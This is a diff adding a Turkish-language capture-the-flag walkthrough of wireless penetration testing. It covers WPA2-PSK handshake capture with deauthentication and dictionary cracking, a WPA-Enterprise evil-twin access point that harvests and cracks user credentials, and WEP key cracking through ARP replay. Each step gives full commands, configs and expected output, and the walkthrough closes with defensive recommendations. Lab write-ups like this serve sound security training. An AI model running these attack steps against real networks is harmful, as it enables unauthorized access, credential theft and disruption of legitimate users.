@@ -1,3 +1,356 @@
+ 
+CTF Walkthrough 
+Bu rapor, üç farklı kablosuz ağ güvenlik senaryosunun (WPA2-PSK, WPA-Enterprise ve WEP) adım adım istismar edilmesini ve ağlara yetkili erişim sağlanmasını kapsamaktadır.
+
+Senaryo 1: WPA2-PSK Ağı (Dictionary Attack)
+Erişim Noktası: TechCorp-WiFi (WPA-PSK)
+
+Saldırı Özeti
+Kablosuz ağ kartı monitor moduna alınarak TechCorp-WiFi isimli ağ keşfedilmiştir. 6. kanalda yayın yapan bu ağa yönelik Deauthentication saldırısı ile 4'lü el sıkışma (4-way handshake) yakalanmış, ardından rockyou.txt sözlük listesi kullanılarak parola kırma işlemi gerçekleştirilmiştir.
+
+Hedef Ağ Bilgileri:
+
+SSID: TechCorp-WiFi
+
+BSSID: 00:14:6C:7E:40:80
+
+Kanal: 6
+
+Şifreleme: WPA2-PSK (CCMP)
+
+Bağlı İstemci: 5C:F9:DD:4A:97:E1
+
+Adım 1: Sistem Hazırlığı ve Interface Kontrolü
+Sistem üzerinde root yetkilerine geçildi ve ağ arayüzleri kontrol edildi.
+
+Kullanılan Komut:
+
+Bash
+
+sudo su
+ip -br -c a
+Beklenen Çıktı:
+
+Plaintext
+
+lo               UNKNOWN        127.0.0.1/8
+eth0             UP             10.10.10.5/24
+wlan0            UP             <MAC_ADRESI>
+Açıklama: wlan0 arayüzünün erişilebilir ve "UP" durumunda olduğu doğrulandı.
+
+Adım 2: Monitor Modunun Etkinleştirilmesi
+Kablosuz kart, havadaki paketleri pasif olarak dinlemek için monitor moduna alındı.
+
+Kullanılan Komut:
+
+Bash
+
+airmon-ng check kill
+airmon-ng start wlan0
+Beklenen Çıktı:
+
+Plaintext
+
+Found 2 processes that could cause trouble.
+Killing processes: NetworkManager, wpa_supplicant...
+
+PHY     Interface   Driver      Chipset
+phy0    wlan0       ath9k       Qualcomm Atheros
+        (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+        (mac80211 station mode vif disabled for [phy0]wlan0)
+Açıklama: Çakışan servisler kapatıldı ve wlan0mon sanal arayüzü oluşturuldu.
+
+Adım 3: Hedef Tespiti ve Handshake Yakalama
+Hedef ağın kanalı ve BSSID'si filtrelenerek dinleme başlatıldı. Handshake yakalamayı tetiklemek için deauth saldırısı uygulandı.
+
+Kullanılan Komut (Terminal 1 - Dinleme):
+
+Bash
+
+airodump-ng wlan0mon -c 6 --bssid 00:14:6C:7E:40:80 -w techcorp_handshake
+Kullanılan Komut (Terminal 2 - Deauth Saldırısı):
+
+Bash
+
+aireplay-ng -0 5 -a 00:14:6C:7E:40:80 -c 5C:F9:DD:4A:97:E1 wlan0mon
+Beklenen Çıktı (Terminal 1): Sağ üst köşede şu ibare görülmelidir:
+
+Plaintext
+
+ CH  6 ][ Elapsed: 1 min ][ 2025-11-29 14:00 ][ WPA handshake: 00:14:6C:7E:40:80
+Adım 4: Parola Kırma
+Yakalanan handshake dosyası (.cap) üzerinde sözlük saldırısı başlatıldı.
+
+Kullanılan Komut:
+
+Bash
+
+aircrack-ng -w /usr/share/wordlists/rockyou.txt techcorp_handshake-01.cap
+Beklenen Çıktı:
+
+Plaintext
+
+                                 Aircrack-ng 1.6
+
+      [00:00:03] 2450/14344392 keys tested (850.34 k/s)
+
+                           KEY FOUND! [ welcome123 ]
+
+      Master Key     : 8A 2B ... (HEX Values)
+      Transient Key  : 1C 3D ... (HEX Values)
+Açıklama: Parola welcome123 olarak tespit edildi.
+
+Adım 5: Ağa Bağlanma ve Kanıt Alma
+Bulunan parola ile ağa bağlanıldı.
+
+Yapılandırma Dosyası (wpa_tech.conf):
+
+Kod snippet'i
+
+network={
+    ssid="TechCorp-WiFi"
+    psk="welcome123"
+    key_mgmt=WPA-PSK
+}
+Kullanılan Komut:
+
+Bash
+
+airmon-ng stop wlan0mon
+wpa_supplicant -B -i wlan0 -c wpa_tech.conf
+dhclient wlan0 -v
+curl http://localhost/flag.txt
+Beklenen Çıktı:
+
+Plaintext
+
+CTF{techcorp_captured_success_8821}
+Senaryo 2: WPA-Enterprise (Rogue AP Attack)
+Erişim Noktası: Enterprise_Secure (WPA-EAP)
+
+Saldırı Özeti
+Hedef ağın (Enterprise_Secure) özelliklerini taklit eden sahte bir erişim noktası (Evil Twin) hostapd-mana kullanılarak oluşturuldu. Kullanıcıların bu sahte ağa bağlanması sağlanarak kimlik bilgileri (NETNTLM hash) ele geçirildi ve asleap aracı ile kırıldı.
+
+Hedef Ağ Bilgileri:
+
+SSID: Enterprise_Secure
+
+Kanal: 11
+
+Şifreleme: WPA-Enterprise (PEAP/MSCHAPv2)
+
+Adım 1: Sertifika Oluşturma
+Sahte AP'nin güvenilir görünmesi için gerekli TLS sertifikaları oluşturuldu.
+
+Kullanılan Komut:
+
+Bash
+
+# CA ve Server sertifikaları
+openssl genrsa -aes256 -out ca.key.pem 4096
+openssl req -x509 -new -nodes -key ca.key.pem -sha256 -days 3650 -out ca.cert.pem
+openssl genrsa -aes256 -out server.key.pem 2048
+openssl req -new -key server.key.pem -out server.csr.pem
+openssl x509 -req -in server.csr.pem -CA ca.cert.pem -CAkey ca.key.pem -CAcreateserial -out server.cert.pem -days 365 -sha256
+openssl dhparam -out dh -2 2048
+Beklenen Çıktı: Komutlar hata vermeden tamamlanmalı ve dizinde .pem uzantılı dosyalar oluşmalıdır.
+
+Adım 2: Hostapd-Mana Yapılandırması ve Başlatma
+mana.conf dosyası hedef ağa göre düzenlendi ve saldırı başlatıldı.
+
+Yapılandırma (mana.conf Özeti):
+
+Kod snippet'i
+
+ssid=Enterprise_Secure
+interface=wlan0
+mana_wpe=1
+ca_cert=ca.cert.pem
+server_cert=server.cert.pem
+private_key=server.key.pem
+Kullanılan Komut:
+
+Bash
+
+hostapd-mana mana.conf
+Beklenen Çıktı:
+
+Plaintext
+
+Configuration file: mana.conf
+Using interface wlan0 with hwaddr ... and ssid "Enterprise_Secure"
+wlan0: AP-ENABLED
+...
+MANA EAP Identity Phase 0: Enterprise\jdoe
+MANA EAP Identity Phase 1: Enterprise\jdoe
+MANA EAP EAP-MSCHAPV2 ASLEAP user=jdoe | asleap -C 5a:2b... -R 8c:1d...
+Açıklama: Kullanıcı jdoe ağa bağlanmaya çalıştı ve Challenge/Response hashleri ekrana düştü.
+
+Adım 3: Hash Kırma (Asleap)
+Yakalanan Challenge (-C) ve Response (-R) değerleri kırılarak düz metin parolaya ulaşıldı.
+
+Kullanılan Komut:
+
+Bash
+
+asleap -C 5a:2b:3c:4d:5e:6f:7a:8b -R 8c:1d:2e:3f:4a:5b:6c:7d:8e:9f:0a:1b:2c:3d:4e:5f -W /usr/share/john/password.lst
+Beklenen Çıktı:
+
+Plaintext
+
+asleap 2.2 - actively recover LEAP/PPTP passwords.
+Using wordlist mode with "/usr/share/john/password.lst".
+    hash bytes:        b90b
+    NT hash:           ...
+    password:          Summer2023!
+Açıklama: Kullanıcı parolası Summer2023! olarak bulundu.
+
+Adım 4: Ağa Bağlanma
+Elde edilen kurumsal kimlik bilgileriyle gerçek ağa bağlanıldı.
+
+Yapılandırma Dosyası (wpa_ent.conf):
+
+Kod snippet'i
+
+network={
+    ssid="Enterprise_Secure"
+    key_mgmt=WPA-EAP
+    eap=PEAP
+    identity="Enterprise\jdoe"
+    password="Summer2023!"
+    phase2="auth=MSCHAPV2"
+}
+Kullanılan Komut:
+
+Bash
+
+wpa_supplicant -Dnl80211 -iwlan0 -c wpa_ent.conf -B
+dhclient wlan0 -v
+curl http://localhost/flag.txt
+Beklenen Çıktı:
+
+Plaintext
+
+CTF{enterprise_rogue_ap_success_b39a}
+Senaryo 3: WEP Ağı (Packet Injection)
+Erişim Noktası: Old-Warehouse (WEP)
+
+Saldırı Özeti
+Eski ve güvensiz WEP şifrelemesi kullanan "Old-Warehouse" ağı tespit edildi. Ağ trafiği düşük olduğu için ARP Replay saldırısı ile paket enjeksiyonu yapılarak IV (Initialization Vector) sayısı yapay olarak artırıldı ve anahtar kırıldı.
+
+Hedef Ağ Bilgileri:
+
+SSID: Old-Warehouse
+
+BSSID: AA:BB:CC:11:22:33
+
+Kanal: 3
+
+Şifreleme: WEP
+
+Adım 1: Hedef Odaklı Dinleme
+Monitor modundaki kart ile hedef kanal dinlenmeye başlandı.
+
+Kullanılan Komut:
+
+Bash
+
+airodump-ng wlan0mon -c 3 --bssid AA:BB:CC:11:22:33 -w wep_capture
+Beklenen Çıktı: #Data sütununun başlangıçta yavaş arttığı gözlemlenir.
+
+Adım 2: Sahte Yetkilendirme (Fake Authentication)
+Paket enjekte edebilmek için ağa "bağlıymış" gibi görünmek gerekir.
+
+Kullanılan Komut (Yeni Terminal):
+
+Bash
+
+aireplay-ng -1 0 -a AA:BB:CC:11:22:33 -h <KENDI_MAC_ADRESINIZ> wlan0mon
+Beklenen Çıktı:
+
+Plaintext
+
+14:15:20  Sending Authentication Request (Open System)
+14:15:20  Authentication successful
+14:15:20  Sending Association Request
+14:15:20  Association successful :-) (AID: 1)
+Açıklama: Gülen yüz :-) ifadesi, ağa başarıyla assoye (ilişkilendirme) olduğumuzu gösterir.
+
+Adım 3: ARP Replay Saldırısı (Trafik Üretme)
+IV toplamak için ARP paketleri yakalanıp tekrar ağa basıldı.
+
+Kullanılan Komut:
+
+Bash
+
+aireplay-ng -3 -b AA:BB:CC:11:22:33 -h <KENDI_MAC_ADRESINIZ> wlan0mon
+Beklenen Çıktı:
+
+Plaintext
+
+Saving ARP requests in replay_arp-1129-141620.cap
+You should also start airodump-ng to capture replies.
+Read 1245 packets (got 540 ARP requests), sent 530 packets... (500 pps)
+Açıklama: Terminaldeki "sent packets" sayısı ve airodump-ng ekranındaki #Data sayısı hızla (saniyede 400-500 paket) artmaya başlamalıdır.
+
+Adım 4: WEP Anahtarını Kırma
+Yaklaşık 20.000 - 30.000 veri paketi toplandıktan sonra kırma işlemi başlatıldı.
+
+Kullanılan Komut:
+
+Bash
+
+aircrack-ng wep_capture-01.cap
+Beklenen Çıktı:
+
+Plaintext
+
+                                 Aircrack-ng 1.6
+
+      [00:00:01] Tested 865 keys (got 24500 IVs)
+
+   KB    depth   byte(vote)
+    0    0/  1   1A(34560) ...
+
+             KEY FOUND! [ 1A:2B:3C:4D:5E ]
+        Decrypted correctly: 100%
+Açıklama: WEP anahtarı 1A:2B:3C:4D:5E olarak bulundu.
+
+Adım 5: Ağa Bağlanma
+Bulunan HEX anahtarı kullanılarak ağa bağlanıldı.
+
+Yapılandırma Dosyası (wpa_wep.conf):
+
+Kod snippet'i
+
+network={
+    ssid="Old-Warehouse"
+    key_mgmt=NONE
+    wep_key0=1A2B3C4D5E
+}
+Kullanılan Komut:
+
+Bash
+
+airmon-ng stop wlan0mon
+wpa_supplicant -B -i wlan0 -c wpa_wep.conf
+dhclient wlan0 -v
+curl http://localhost/flag.txt
+Beklenen Çıktı:
+
+Plaintext
+
+CTF{wep_cracked_old_school_f921}
+Güvenlik Önerileri (Genel Sonuç)
+WPA2/WPA3 Kullanımı: WEP kesinlikle kullanılmamalıdır. WPA2-CCMP veya mümkünse WPA3 standardına geçilmelidir.
+
+Güçlü Parola Politikası: Sözlük saldırılarını engellemek için en az 12 karakterli, karmaşık ve tahmin edilemez parolalar kullanılmalıdır.
+
+Sertifika Doğrulaması: Kurumsal ağlarda (WPA-Enterprise), istemcilerin sunucu sertifikasını doğrulayacak şekilde yapılandırılması Rogue AP saldırılarını engeller.
+
+Ağ Segmentasyonu: Kablosuz ağlar, kritik iç ağlardan izole edilmeli ve erişim kısıtlanmalıdır.
+
+--------------
 Kablosuz Ağ Sızma Testi Uygulama Rehberi (Walkthrough)
 Bu doküman, üç farklı kablosuz ağ güvenliği senaryosunun (WPA2-PSK, WPA-Enterprise ve WEP) analiz edilmesi, istismar edilmesi ve ağa erişim sağlanması adımlarını içerir.
 
